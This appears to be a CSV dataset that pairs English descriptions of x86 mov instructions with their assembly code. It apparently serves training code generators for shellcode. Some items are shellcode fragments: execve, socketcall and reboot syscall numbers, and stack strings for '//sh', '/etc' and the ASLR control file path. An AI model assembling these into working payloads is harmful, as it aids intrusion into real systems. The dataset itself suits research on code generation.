move the contents of eax into address defined by ebp+var_a,move contents var0 address defined ebp+var_a,"mov [ebp+var_a] , eax","mov [var1] , var0"
move dl into the address [ebx + 6],move dl into the address [ebx + 6],"mov [ebx+6] , dl","mov [ebx+6] , dl"
move 110 into the effective address saved in ebx,move 110 effective address saved var0,"mov [ebx] , 110","mov [var0] , 110"
move 123 into the effective address saved in ebx,move 123 effective address saved var0,"mov [ebx] , 123","mov [var0] , 123"
move dl into the address [ebx+0xe],move dl into the address [ebx+0xe],"mov [ebx+0xe] , dl","mov [ebx+0xe] , dl"
move eax into ebx+12,move var0 ebx+12,"mov [ebx+12] , eax","mov [var1] , var0"
move al into ebx+7,move al ebx+7,"mov [ebx+7] , al","mov [var0] , al"
move ebx into ebx+8,move ebx ebx+8,"mov [ebx+8] , ebx","mov [var0] , ebx"
move 25 decimal into the memory address ecx,move 25 decimal memory address var0,"mov [ecx] , 25","mov [var0] , 25"
move eax into the address [ecx+4],move eax into the address [ecx+4],"mov [ecx+4] , eax","mov [ecx+4] , eax"
move al into edi register,move al var0 register,"mov [edi] , al","mov [var0] , al"
move al into the address [esi+22],move al into the address [esi+22],"mov [esi+22] , al","mov [esi+22] , al"
move al into the address [esi+34],move al into the address [esi+34],"mov [esi+34] , al","mov [esi+34] , al"
move esi into the address [esi+35],move esi into the address [esi+35],"mov [esi+35] , esi","mov [esi+35] , esi"
move ebx into the address [esi+39],move ebx into the address [esi+39],"mov [esi+39] , ebx","mov [esi+39] , ebx"
move ebx into the address [esi+43],move ebx into the address [esi+43],"mov [esi+43] , ebx","mov [esi+43] , ebx"
move eax into the address [esi+47],move eax into the address [esi+47],"mov [esi+47] , eax","mov [esi+47] , eax"
move the contents of cl into the byte at memory address esi+eax,move contents cl byte memory address esi+eax,"mov [esi+eax] , cl","mov [var0] , cl"
move cl into the address [esp + 1],move cl into the address [esp + 1],"mov [esp+1] , cl","mov [esp+1] , cl"
move esp into the address [esp+4],move esp into the address [esp+4],"mov [esp+4] , esp","mov [esp+4] , esp"
move al into the address [esp+57],move al into the address [esp+57],"mov [esp+57] , al","mov [esp+57] , al"
move ah into the address [esp+58],move ah into the address [esp+58],"mov [esp+58] , ah","mov [esp+58] , ah"
move ebx into the address [esp+59],move ebx into the address [esp+59],"mov [esp+59] , ebx","mov [esp+59] , ebx"
move the contents of ebx into the 4 bytes at memory address var,move contents var0 4 bytes memory address var,"mov [var] , ebx","mov [var] , var0"
move the contents of eax into the 4 bytes at memory address var1,move contents var0 4 bytes memory address var1,"mov [var1] , eax","mov [var1] , var0"
move al into memory address a_letter,move al memory address var0,"mov a_letter , al","mov var0 , al"
move 0x80 into ah,move var0 var1,"mov ah , 0x80","mov var1 , var0"
move the effective address of byte_tbl+2 to al register,move effective address var0 al register,"mov al , [byte_tbl+2]","mov al , [var0]"
move the contents of the esi register into the al register,move contents var0 register al register,"mov al , [esi]","mov al , [var0]"
move 03h into al,move 03h al,"mov al , 03h","mov al , 03h"
move 04h into al,move var0 al,"mov al , 04h","mov al , var0"
move 05h into al,move 05h al,"mov al , 05h","mov al , 05h"
move 0x1 into lower byte of the eax register,move var0 lower byte var1 register,"mov al , 0x01","mov al , 0x01"
move 0x01 into al,move var0 al,"mov al , 0x01","mov al , var0"
move 0x04 into al,move var0 al,"mov al , 0x04","mov al , var0"
put the syscall 0x5 into the al register,put syscall var0 al register,"mov al , 0x05","mov al , 0x05"
move 0x06 into al,move var0 al,"mov al , 0x06","mov al , var0"
move 0x0a into al,move var0 al,"mov al , 0x0a","mov al , var0"
move 0x0b into al,move var0 al,"mov al , 0x0b","mov al , var0"
move the value 0x1 into the al register,move value var0 al register,"mov al , 0x1","mov al , var0"
move 0x1 into lower byte of the eax register,move var0 lower byte var1 register,"mov al , 0x1","mov al , var0"
move 0x17 into al,move var0 al,"mov al , 0x17","mov al , var0"
move 0x1f into al,move var0 al,"mov al , 0x1f","mov al , var0"
put the syscall 0x2 into the al register,put syscall var0 al register,"mov al , 0x2","mov al , var0"
move 0x21 into al,move var0 al,"mov al , 0x21","mov al , var0"
move 0x2e into al,move var0 al,"mov al , 0x2e","mov al , var0"
move 0x3 into al,move var0 al,"mov al , 0x3","mov al , var0"
move 0x30 into al,move var0 al,"mov al , 0x30","mov al , var0"
move 0x33 into al,move var0 al,"mov al , 0x33","mov al , var0"
move 0x3f into al,move var0 al,"mov al , 0x3f","mov al , var0"
syscall 63,syscall 63,"mov al , 0x3f","mov al , 0x3f"
move the value 0x4 into the al register,move value var0 al register,"mov al , 0x4","mov al , var0"
move 0x4 into al,move var0 al,"mov al , 0x4","mov al , var0"
move 0x42 into al,move var0 al,"mov al , 0x42","mov al , var0"
move 0x46 into al,move var0 al,"mov al , 0x46","mov al , var0"
move the value 0x5 into the al register,move value var0 al register,"mov al , 0x5","mov al , var0"
move 0x5 into al,move var0 al,"mov al , 0x5","mov al , var0"
load the syscall value 0x58 for reboot in the al register,load syscall value var0 var1 reboot al register,"mov al , 0x58","mov al , var0"
move 0x6 into al,move var0 al,"mov al , 0x6","mov al , var0"
make the socketcall,make var0,"mov al , 0x66","mov al , 0x66"
make the systemcall socketcall,make var0 var1,"mov al , 0x66","mov al , 0x66"
move 0x66 into al,move var0 al,"mov al , 0x66","mov al , var0"
syscall 102,syscall 102,"mov al , 0x66","mov al , 0x66"
system call socketcall,system call var0,"mov al , 0x66","mov al , 0x66"
move 0x7 into al,move var0 al,"mov al , 0x7","mov al , var0"
put the syscall 0x8 into the al register,put syscall var0 al register,"mov al , 0x8","mov al , var0"
move 0xa2 into al,move var0 al,"mov al , 0xa2","mov al , var0"
execve system call number 11,execve system call number 11,"mov al , 0xb","mov al , 0xb"
mov 0xb into lower byte of eax,var0 var1 lower byte var2,"mov al , 0xb","var0 al , var1"
move 0xb into al,move var0 al,"mov al , 0xb","mov al , var0"
move 0xb5 into al,move var0 al,"mov al , 0xb5","mov al , var0"
move 0xcd into al,move var0 al,"mov al , 0xcd","mov al , var0"
move 0xf into al,move var0 al,"mov al , 0xf","mov al , var0"
move the value 1 into the al register,move value 1 al register,"mov al , 1","mov al , 1"
move 1 into al,move 1 al,"mov al , 1","mov al , 1"
transfer the value 10 to the al register,transfer value 10 al register,"mov al , 10","mov al , 10"
move 102 into al,move 102 al,"mov al , 102","mov al , 102"
put the syscall 11 into the al register,put syscall 11 al register,"mov al , 11","mov al , 11"
move the value 11 into the al register,move value 11 al register,"mov al , 11","mov al , 11"
move 12 into al,move 12 al,"mov al , 12","mov al , 12"
move 15 into lower byte of the eax register,move 15 lower byte var0 register,"mov al , 15","mov al , 15"
move 16 into al,move 16 al,"mov al , 16","mov al , 16"
move 2 into al,move 2 al,"mov al , 2","mov al , 2"
move 20 into al,move 20 al,"mov al , 20","mov al , 20"
move 23 into al,move 23 al,"mov al , 23","mov al , 23"
move 37 into al,move 37 al,"mov al , 37","mov al , 37"
move 39 into al,move 39 al,"mov al , 39","mov al , 39"
store 4 into al,store 4 al,"mov al , 4","mov al , 4"
move 4 into al,move 4 al,"mov al , 4","mov al , 4"
move 5 into al,move 5 al,"mov al , 5","mov al , 5"
move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero,move value 5 al register then decrement contents al register and jump var0 label if result not zero,"mov al , 5 \n dec al \n jnz l2","mov al , 5 \n dec al \n jnz var0"
move 54 into al,move 54 al,"mov al , 54","mov al , 54"
move 6 into al,move 6 al,"mov al , 6","mov al , 6"
move 61 into al,move 61 al,"mov al , 61","mov al , 61"
save 63 into al,save 63 al,"mov al , 63","mov al , 63"
move 66h into al,move var0 al,"mov al , 66h","mov al , var0"
move 70 into al,move 70 al,"mov al , 70","mov al , 70"
move 72h into al,move var0 al,"mov al , 72h","mov al , var0"
move 99 into al,move 99 al,"mov al , 99","mov al , 99"
move data at memory location a_letter into al,move data memory location var0 al,"mov al , a_letter","mov al , var0"
move the effective address of digits+eax into al,move effective address var0 al,"mov al , byte [digits+eax]","mov al , byte [var0]"
move the byte in edi into the al register,move byte var0 al register,"mov al , byte [edi]","mov al , byte [var0]"
move the effective address edx+ecx into al,move effective address var0 al,"mov al , byte [edx+ecx]","mov al , byte [var0]"
move the byte 0bh into al,move byte var0 al,"mov al , byte 0bh","mov al , byte var0"
move the byte at the address 0bh into al,move byte address var0 al,"mov al , byte 0bh","mov al , byte var0"
move the byte at the address 0x1 into al,move byte address var0 al,"mov al , byte 0x1","mov al , byte var0"
move the byte 2ah into al,move byte var0 al,"mov al , byte 2ah","mov al , byte var0"
move the byte at the address 2ah into al,move byte address var0 al,"mov al , byte 2ah","mov al , byte var0"
move the byte 2h into al,move byte 2h al,"mov al , byte 2h","mov al , byte 2h"
move the byte at the address 2h into al,move byte address 2h al,"mov al , byte 2h","mov al , byte 2h"
move the byte 3fh into al,move byte var0 al,"mov al , byte 3fh","mov al , byte var0"
move the byte at the address 3fh into al,move byte address var0 al,"mov al , byte 3fh","mov al , byte var0"
move the byte 3h into al,move byte var0 al,"mov al , byte 3h","mov al , byte var0"
move the byte at the address 3h into al,move byte address var0 al,"mov al , byte 3h","mov al , byte var0"
move the byte 66h into al,move byte var0 al,"mov al , byte 66h","mov al , byte var0"
move the byte at the address 66h into al,move byte address var0 al,"mov al , byte 66h","mov al , byte var0"
move the byte 6h into al,move byte 6h al,"mov al , byte 6h","mov al , byte 6h"
move the byte at the address 6h into al,move byte address 6h al,"mov al , byte 6h","mov al , byte 6h"
move a byte from the address buff+ecx into al,move byte address var0 al,"mov al , byte[buff+ecx]","mov al , byte[var0]"
move close_syscall into al,move var0 al,"mov al , close_syscall","mov al , var0"
move write_syscall into al,move var0 al,"mov al , write_syscall","mov al , var0"
load the object at the address 1000h into the ax register,load object address 1000h ax register,"mov ax , [1000h]","mov ax , [1000h]"
copy thevalue at memory address specified by di into ax,copy var0 memory address specified var1 ax,"mov ax , [di]","mov ax , [var1]"
store the contents at the address pointed by esi into the ax register,store contents address pointed var0 ax register,"mov ax , [esi]","mov ax , [var0]"
copy my_var contents in ax,copy var0 contents ax,"mov ax , [my_var]","mov ax , [var0]"
initialize ax to 00,initialize ax 00,"mov ax , 00","mov ax , 00"
move value of 0x010ch into the register ax,move value 0x010ch register ax,"mov ax , 010ch","mov ax , 010ch"
move 0x167 into ax,move var0 ax,"mov ax , 0x167","mov ax , var0"
move 0x169 into ax,move var0 ax,"mov ax , 0x169","mov ax , var0"
move 0x16a into ax,move var0 ax,"mov ax , 0x16a","mov ax , var0"
move 0x16b into ax,move var0 ax,"mov ax , 0x16b","mov ax , var0"
move 0x16c into ax,move var0 ax,"mov ax , 0x16c","mov ax , var0"
move value of 1 into register ax,move value 1 register ax,"mov ax , 1","mov ax , 1"
move 102 into ax,move 102 ax,"mov ax , 102","mov ax , 102"
move 1666 into ax,move 1666 ax,"mov ax , 1666","mov ax , 1666"
transfer the immediate constant 45h to ax,transfer immediate constant var0 ax,"mov ax , 45h","mov ax , var0"
move 8h into ax,move var0 ax,"mov ax , 8h","mov ax , var0"
get 9 in the ax,get 9 ax,"mov ax , 9","mov ax , 9"
move bx into ax,move var0 ax,"mov ax , bx","mov ax , var0"
move the contents of bx into ax,move contents var0 ax,"mov ax , bx","mov ax , var0"
move 0x01 into bl,move var0 var1,"mov bl , 0x01","mov var1 , var0"
move 0x02 into bl,move var0 var1,"mov bl , 0x02","mov var1 , var0"
move 0x04 into bl,move var0 var1,"mov bl , 0x04","mov var1 , var0"
move the value 0x1 into the bl register,move value var0 var1 register,"mov bl , 0x1","mov var1 , var0"
move 0x1 into bl,move var0 var1,"mov bl , 0x1","mov var1 , var0"
move 0x14 into bl,move var0 var1,"mov bl , 0x14","mov var1 , var0"
move 0x2 into bl,move var0 var1,"mov bl , 0x2","mov var1 , var0"
move the value 0x2 into the bl register,move value var0 var1 register,"mov bl , 0x2","mov var1 , var0"
move 0x3 into bl,move var0 var1,"mov bl , 0x3","mov var1 , var0"
move the value 0x4 onto the stack,move value var0 stack,"mov bl , 0x4","mov bl , var0"
move 0x4 into bl,move var0 var1,"mov bl , 0x4","mov var1 , var0"
move 0x5 into bl,move var0 var1,"mov bl , 0x5","mov var1 , var0"
move the value 0x5 into the bl register,move value var0 var1 register,"mov bl , 0x5","mov var1 , var0"
move 0x7 into bl,move var0 var1,"mov bl , 0x7","mov var1 , var0"
move 0x8 into bl,move var0 var1,"mov bl , 0x8","mov var1 , var0"
move 0x9 into bl,move var0 var1,"mov bl , 0x9","mov var1 , var0"
move 0xe into bl,move var0 var1,"mov bl , 0xe","mov var1 , var0"
move 10 into bl,move 10 var0,"mov bl , 10","mov var0 , 10"
move 2 into bl,move 2 var0,"mov bl , 2","mov var0 , 2"
move 3 into bl,move 3 var0,"mov bl , 3","mov var0 , 3"
move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero,move value 3 var0 register then decrement contents var0 register and jump var2 label if result not zero,"mov bl , 3 \n dec bl \n jnz l3","mov var0 , 3 \n dec var0 \n jnz var2"
move 4 into bl,move 4 var0,"mov bl , 4","mov var0 , 4"
store 5 into bl,store 5 var0,"mov bl , 5","mov var0 , 5"
move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero,move contents al register contents var0 register then subtract value 2 cl register and jump loop label if result not zero,"mov bl , al \n sub bl , 2 \n jnz loop","mov var0 , al \n sub var0 , 2 \n jnz loop"
move the byte at address digits+ebx into bl,move byte address var0 var1,"mov bl , byte [digits+ebx]","mov var1 , byte [var0]"
move the byte in eax into bl,move byte var0 var1,"mov bl , byte [eax]","mov var1 , byte [var0]"
move the byte at the address 0eh into bl,move byte address var0 var1,"mov bl , byte 0eh","mov var1 , byte var0"
move cl into bl,move cl var0,"mov bl , cl","mov var0 , cl"
move the contents of the esi register into the bx register,move contents var0 register var1 register,"mov bx , [esi]","mov var1 , [var0]"
move 1666 into bx,move 1666 var0,"mov bx , 1666","mov var0 , 1666"
get 18 in the bx register,get 18 var0 register,"mov bx , 18","mov var0 , 18"
move the value 20 into bx,move value 20 var0,"mov bx , 20","mov var0 , 20"
move memory word_value to register bx,move memory var0 register var1,"mov bx , word_value","mov var1 , var0"
move dl into the byte at address [eax],move dl into the byte at address [eax],"mov byte [eax] , dl","mov byte [eax] , dl"
move 2 into the single byte at the address stored in ebx,move 2 single byte address stored var0,"mov byte [ebx] , 2","mov byte [var0] , 2"
move 2 into the single byte at memory location ecx,move 2 single byte memory location var0,"mov byte [ecx] , 2","mov byte [var0] , 2"
move dl into the byte at address [ecx+92],move dl into the byte at address [ecx+92],"mov byte [ecx+92] , dl","mov byte [ecx+92] , dl"
move dl into the single byte at the address stored in ecx+92,move dl single byte address stored ecx+92,"mov byte [ecx+92] , dl","mov byte [var0] , dl"
move bl into the byte in edi,move var0 byte var1,"mov byte [edi] , bl","mov byte [var1] , var0"
move al into the single byte at the address stored in edx+ecx,move al single byte address stored edx+ecx,"mov byte [edx+ecx] , al","mov byte [var0] , al"
move dl into the byte at address [esi + 1],move dl into the byte at address [esi + 1],"mov byte [esi+1] , dl","mov byte [esi+1] , dl"
move bl into the byte at address [esi],move bl into the byte at address [esi],"mov byte [esi] , bl","mov byte [esi] , bl"
move al into the byte at address [esi+11],move al into the byte at address [esi+11],"mov byte [esi+11] , al","mov byte [esi+11] , al"
move al into the byte at address [esi+12],move al into the byte at address [esi+12],"mov byte [esi+12] , al","mov byte [esi+12] , al"
move al into the byte at address [esi+14],move al into the byte at address [esi+14],"mov byte [esi+14] , al","mov byte [esi+14] , al"
move the contents of al into the byte at the memory location specified by the operation [esi+14],move the contents of al into the byte at the memory location specified by the operation [esi+14],"mov byte [esi+14] , al","mov byte [esi+14] , al"
move al into the byte at address [esi+17],move al into the byte at address [esi+17],"mov byte [esi+17] , al","mov byte [esi+17] , al"
move the contents of al into the byte at the memory location specified by the operation [esi+17],move the contents of al into the byte at the memory location specified by the operation [esi+17],"mov byte [esi+17] , al","mov byte [esi+17] , al"
move al into the byte at address [esi+21],move al into the byte at address [esi+21],"mov byte [esi+21] , al","mov byte [esi+21] , al"
move al into the byte at address [esi+7],move al into the byte at address [esi+7],"mov byte [esi+7] , al","mov byte [esi+7] , al"
move 0x2e into the byte in esp,move var0 byte esp,"mov byte [esp] , 0x2e","mov byte [esp] , var0"
move 0x2f into the byte at address [esp],move 0x2f into the byte at address [esp],"mov byte [esp] , 0x2f","mov byte [esp] , 0x2f"
move 0x2f into the byte in esp,move var0 byte esp,"mov byte [esp] , 0x2f","mov byte [esp] , var0"
move 0x7f into the byte at address [esp],move 0x7f into the byte at address [esp],"mov byte [esp] , 0x7f","mov byte [esp] , 0x7f"
move 0x07 into the byte at address [esp+2],move 0x07 into the byte at address [esp+2],"mov byte [esp+2] , 0x07","mov byte [esp+2] , 0x07"
move 0x01 into the byte at address [esp+3],move 0x01 into the byte at address [esp+3],"mov byte [esp+3] , 0x01","mov byte [esp+3] , 0x01"
move 0x11 into the byte at address [esp+3],move 0x11 into the byte at address [esp+3],"mov byte [esp+3] , 0x11","mov byte [esp+3] , 0x11"
move a byte from bl into memory address hexstr+edx+1,move byte var0 memory address hexstr+edx+1,"mov byte [hexstr+edx+1] , bl","mov byte [var1] , var0"
move a byte from al into memory address hexstr+edx+2,move byte al memory address hexstr+edx+2,"mov byte [hexstr+edx+2] , al","mov byte [var0] , al"
store the value 5 into the byte at memory location var,store value 5 byte memory location var,"mov byte [var] , 5","mov byte [var] , 5"
move 0x0b into the byte at address al,move var0 byte address al,"mov byte al , 0x0b","mov byte al , var0"
move 0x3f into the byte at address al,move var0 byte address al,"mov byte al , 0x3f","mov byte al , var0"
move 0x3f into the byte in al,move var0 byte al,"mov byte al , 0x3f","mov byte al , var0"
move 0xa4 into the byte at address al,move var0 byte address al,"mov byte al , 0xa4","mov byte al , var0"
move 0xa4 into the byte in al,move var0 byte al,"mov byte al , 0xa4","mov byte al , var0"
move 11 into the byte at address al,move 11 byte address al,"mov byte al , 11","mov byte al , 11"
move 83 into the byte at address al,move 83 byte address al,"mov byte al , 83","mov byte al , 83"
move 7 into the byte at address cl,move 7 byte address cl,"mov byte cl , 7","mov byte cl , 7"
move 077o into cl,move var0 cl,"mov cl , 077o","mov cl , var0"
move 0x1 into cl,move var0 cl,"mov cl , 0x1","mov cl , var0"
move 0x1e into cl,move var0 cl,"mov cl , 0x1e","mov cl , var0"
move 0x2 into cl,move var0 cl,"mov cl , 0x2","mov cl , var0"
move the value 0x2 into the cl register,move value var0 cl register,"mov cl , 0x2","mov cl , var0"
move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero,move value 10 cl register then decrement contents cl register and jump var0 label if result not zero,"mov cl , 10 \n dec cl \n jnz l1","mov cl , 10 \n dec cl \n jnz var0"
move 100 into cl,move 100 cl,"mov cl , 100","mov cl , 100"
move 128 into cl,move 128 cl,"mov cl , 128","mov cl , 128"
move 13 into cl,move 13 cl,"mov cl , 13","mov cl , 13"
move 2 into cl,move 2 cl,"mov cl , 2","mov cl , 2"
move 21 into cl,move 21 cl,"mov cl , 21","mov cl , 21"
move 3 into cl,move 3 cl,"mov cl , 3","mov cl , 3"
move 30 into cl,move 30 cl,"mov cl , 30","mov cl , 30"
move 30 to the cl register,move 30 cl register,"mov cl , 30","mov cl , 30"
move 32 into cl,move 32 cl,"mov cl , 32","mov cl , 32"
move 9 into cl,move 9 cl,"mov cl , 9","mov cl , 9"
backup al into cl,backup al cl,"mov cl , al","mov cl , al"
move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero,move contents var0 register contents cl register then subtract value 1 cl register and jump loop label if result not zero,"mov cl , bl \n sub cl , 1 \n jnz loop","mov cl , var0 \n sub cl , 1 \n jnz loop"
move the byte at the address [eax] into cl,move the byte at the address [eax] into cl,"mov cl , byte [eax]","mov cl , byte [eax]"
move the byte in esi into cl,move byte var0 cl,"mov cl , byte [esi]","mov cl , byte [var0]"
move the 3rd element of the byte_table into cl,move 3rd element var0 cl,"mov cl , byte_table+2","mov cl , var0+2"
move shellcode_length into cl,move var0 cl,"mov cl , shellcode_length","mov cl , var0"
move shellcodelen into cl,move var0 cl,"mov cl , shellcodelen","mov cl , var0"
move bx to count,move var0 count,"mov count , bx","mov count , var0"
move the contents of the esi register into the cx register,move contents var0 register cx register,"mov cx , [esi]","mov cx , [var0]"
initialize cx to 01,initialize cx 01,"mov cx , 01","mov cx , 01"
move 02001 into cx,move 02001 cx,"mov cx , 02001","mov cx , 02001"
move 0666 into cx,move 0666 cx,"mov cx , 0666","mov cx , 0666"
move 0700 into cx,move 0700 cx,"mov cx , 0700","mov cx , 0700"
move 0x191 into cx,move var0 cx,"mov cx , 0x191","mov cx , var0"
move 0x1ff into cx,move var0 cx,"mov cx , 0x1ff","mov cx , var0"
move 0x2bc into cx,move var0 cx,"mov cx , 0x2bc","mov cx , var0"
move the value 0x301 into the cx register,move value var0 cx register,"mov cx , 0x301","mov cx , var0"
mov the value 0x3b30 into the cx register,var0 value var1 cx register,"mov cx , 0x3b30","var0 cx , var1"
move 0x401 into cx,move var0 cx,"mov cx , 0x401","mov cx , var0"
move 0x5309 into cx,move var0 cx,"mov cx , 0x5309","mov cx , var0"
move 0x9ed into cx,move var0 cx,"mov cx , 0x9ed","mov cx , var0"
move 0xfff into cx,move var0 cx,"mov cx , 0xfff","mov cx , var0"
move 2001 into cx,move 2001 cx,"mov cx , 2001","mov cx , 2001"
move 2001Q into cx,move var0 cx,"mov cx , 2001Q","mov cx , var0"
move the 4th element of the word_table into cx,move 4th element var0 cx,"mov cx , word_table+3","mov cx , var0+3"
move the 4th element of the array word_table into cx,move 4th element array var0 cx,"mov cx , word_table[3]","mov cx , var0[3]"
move 0x02 into dl,move var0 dl,"mov dl , 0x02","mov dl , var0"
move 0x09 into dl,move var0 dl,"mov dl , 0x09","mov dl , var0"
move 0x1 into dl,move var0 dl,"mov dl , 0x1","mov dl , var0"
move 0x10 into dl,move var0 dl,"mov dl , 0x10","mov dl , var0"
move 0x14 into dl,move var0 dl,"mov dl , 0x14","mov dl , var0"
move 0x1c into dl,move var0 dl,"mov dl , 0x1c","mov dl , var0"
move 0x2 into dl,move var0 dl,"mov dl , 0x2","mov dl , var0"
move 0x7f into dl,move var0 dl,"mov dl , 0x7f","mov dl , var0"
move 0xc into dl,move var0 dl,"mov dl , 0xc","mov dl , var0"
move 0xd into dl,move var0 dl,"mov dl , 0xd","mov dl , var0"
move 1+0feh into dl,move var0 dl,"mov dl , 1+0feh","mov dl , var0"
move 93 into dl,move 93 dl,"mov dl , 93","mov dl , 93"
move the byte at the address [eax + 1] into dl,move byte address [var0] dl,"mov dl , byte [eax+1]","mov dl , byte [eax+1]"
move the byte at the address [eax] into dl,move the byte at the address [eax] into dl,"mov dl , byte [eax]","mov dl , byte [eax]"
move the byte in eax into dl,move byte var0 dl,"mov dl , byte [eax]","mov dl , byte [var0]"
move the byte at the address [esi + 1] into dl,move the byte at the address [esi + 1] into dl,"mov dl , byte [esi+1]","mov dl , byte [esi+1]"
move the byte at the address 0ffh into dl,move byte address var0 dl,"mov dl , byte 0ffh","mov dl , byte var0"
move the contents stored at the address len into the dl register,move contents stored address var0 dl register,"mov dl , len","mov dl , var0"
copy the value in var1 into the doubleword starting at the address in eax,copy value var0 doubleword starting address var1,"mov dword [eax] , var1","mov dword [var1] , var0"
move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx,move var0 integer representation 2 doubleword starting address var1,"mov dword [ebx] , 2","mov dword [var1] , 2"
move the 32-bit integer representation of 4 into the doubleword starting at address ebx,move var0 integer representation 4 doubleword starting address var1,"mov dword [ebx] , 4","mov dword [var1] , 4"
move eax into the dword at address [esi + 12],move eax into the dword at address [esi + 12],"mov dword [esi+12] , eax","mov dword [esi+12] , eax"
move ebx into the dword at address [esi + 8],move ebx into the dword at address [esi + 8],"mov dword [esi+8] , ebx","mov dword [esi+8] , ebx"
move the value 0x5f657a69 into the double word starting at the address [esp-0x10],move the value 0x5f657a69 into the double word starting at the address [esp-0x10],"mov dword [esp-0x10] , 0x5f657a69","mov dword [esp-0x10] , 0x5f657a69"
move the value 0x6d6f646e into the double word starting at the address [esp-0x14],move the value 0x6d6f646e into the double word starting at the address [esp-0x14],"mov dword [esp-0x14] , 0x6d6f646e","mov dword [esp-0x14] , 0x6d6f646e"
move the value 0x61722f6c into the double word starting at the address [esp-0x18],move the value 0x61722f6c into the double word starting at the address [esp-0x18],"mov dword [esp-0x18] , 0x61722f6c","mov dword [esp-0x18] , 0x61722f6c"
move the value 0x656e7265 into the double word starting at the address [esp-0x1c],move the value 0x656e7265 into the double word starting at the address [esp-0x1c],"mov dword [esp-0x1c] , 0x656e7265","mov dword [esp-0x1c] , 0x656e7265"
move the value 0x6b2f7379 into the double word starting at the address [esp-0x20],move the value 0x6b2f7379 into the double word starting at the address [esp-0x20],"mov dword [esp-0x20] , 0x6b2f7379","mov dword [esp-0x20] , 0x6b2f7379"
move the value 0x732f636f into the double word starting at the address [esp-0x24],move the value 0x732f636f into the double word starting at the address [esp-0x24],"mov dword [esp-0x24] , 0x732f636f","mov dword [esp-0x24] , 0x732f636f"
move the value 0x72702f2f into the double word starting at the address [esp-0x28],move the value 0x72702f2f into the double word starting at the address [esp-0x28],"mov dword [esp-0x28] , 0x72702f2f","mov dword [esp-0x28] , 0x72702f2f"
move the contents of the eax into the double word starting at the address [esp-0x4],move the contents of the eax into the double word starting at the address [esp-0x4],"mov dword [esp-0x4] , eax","mov dword [esp-0x4] , eax"
move the value 0x65636170 into the double word starting at the address [esp-0x8],move the value 0x65636170 into the double word starting at the address [esp-0x8],"mov dword [esp-0x8] , 0x65636170","mov dword [esp-0x8] , 0x65636170"
move the value 0x735f6176 into the double word starting at the address [esp-0xc],move the value 0x735f6176 into the double word starting at the address [esp-0xc],"mov dword [esp-0xc] , 0x735f6176","mov dword [esp-0xc] , 0x735f6176"
move 0x6374652f into the dword at address [esp-12],move 0x6374652f into the dword at address [esp-12],"mov dword [esp-12] , 0x6374652f","mov dword [esp-12] , 0x6374652f"
move 0x6374652f into the dword at the memory location [esp-12],move 0x6374652f into the dword at the memory location [esp-12],"mov dword [esp-12] , 0x6374652f","mov dword [esp-12] , 0x6374652f"
move ecx into the doubleword starting at the address esp-4,move var0 doubleword starting address esp-4,"mov dword [esp-4] , ecx","mov dword [var1] , var0"
move esi into the dword at address [esp-4],move esi into the dword at address [esp-4],"mov dword [esp-4] , esi","mov dword [esp-4] , esi"
move the contents of the esi register into the dword at the memory location [esp-4],move the contents of the esi register into the dword at the memory location [esp-4],"mov dword [esp-4] , esi","mov dword [esp-4] , esi"
move esi into the doubleword starting at the address esp-4,move var0 doubleword starting address esp-4,"mov dword [esp-4] , esi","mov dword [var1] , var0"
move 0x68732f2f into the dword at address [esp-8],move 0x68732f2f into the dword at address [esp-8],"mov dword [esp-8] , 0x68732f2f","mov dword [esp-8] , 0x68732f2f"
move 0x68732f2f into the dword at the memory location [esp-8],move 0x68732f2f into the dword at the memory location [esp-8],"mov dword [esp-8] , 0x68732f2f","mov dword [esp-8] , 0x68732f2f"
move edi into the doubleword starting at the address esp-8,move var0 doubleword starting address esp-8,"mov dword [esp-8] , edi","mov dword [var1] , var0"
move 0x1a4 into dx,move var0 var1,"mov dx , 0x1a4","mov var1 , var0"
move the value 0x2a1 into the dx register,move value var0 var1 register,"mov dx , 0x2a1","mov var1 , var0"
move 0xb01 into dx,move var0 var1,"mov dx , 0xb01","mov var1 , var0"
move 1222 into dx,move 1222 var0,"mov dx , 1222","mov var0 , 1222"
move 132 into dx,move 132 var0,"mov dx , 132","mov var0 , 132"
move 16666 into dx,move 16666 var0,"mov dx , 16666","mov var0 , 16666"
move _start into eax,move var0 var1,"mov eax , _start","mov var1 , var0"
move value of memory address [ebp+8] into eax,move value of memory address [ebp+8] into eax,"mov eax , [ebp+8]","mov eax , [ebp+8]"
move the 4 bytes in memory at the address contained in ebx into eax,move 4 bytes memory address contained var0 var1,"mov eax , [ebx]","mov var1 , [var0]"
copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register,copy 4 byte memory location specified the result operation var0 var1 register,"mov eax , [ebx+8]","mov var1 , [var0]"
move the contents of memory address ebx+epi*4+2 into eax,move contents memory address var0 var1,"mov eax , [ebx+epi*4+2]","mov var1 , [var0]"
move the contents of memory address ebx+esi into eax,move contents memory address var0 var1,"mov eax , [ebx+esi]","mov var1 , [var0]"
move the contents of memory address ebx+esi*2+4 into eax,move contents memory address var0 var1,"mov eax , [ebx+esi*2+4]","mov var1 , [var0]"
move 4 bytes at memory address esi-4 into eax,move 4 bytes memory address var0 var1,"mov eax , [esi-4]","mov var1 , [var0]"
move the contents of memory address esp into eax,move contents memory address esp var0,"mov eax , [esp]","mov var0 , [esp]"
move the value of register at address esp+4 and store into eax,move value register address var0 and store var1,"mov eax , [esp+4]","mov var1 , [var0]"
move the contents at memory specified by temp into eax,move contents memory specified temp var0,"mov eax , [temp]","mov var0 , [temp]"
move the contents at memory address temp1 to eax,move contents memory address var0 var1,"mov eax , [temp1]","mov var1 , [var0]"
move the contents at memory specified by x to eax,move contents memory specified x var0,"mov eax , [x]","mov var0 , [x]"
move the contents at memory address y to eax,move contents memory address y var0,"mov eax , [y]","mov var0 , [y]"
move the contents at memory specified by y to eax,move contents memory specified y var0,"mov eax , [y]","mov var0 , [y]"
move the contents at memory specified by z to eax,move contents memory specified z var0,"mov eax , [z]","mov var0 , [z]"
move 0ah into eax,move var0 var1,"mov eax , 0ah","mov var1 , var0"
move an ascii linefeed character into eax,move ascii var0 character var1,"mov eax , 0ah","mov var1 , 0ah"
move linefeed character into eax,move var0 character var1,"mov eax , 0ah","mov var1 , 0ah"
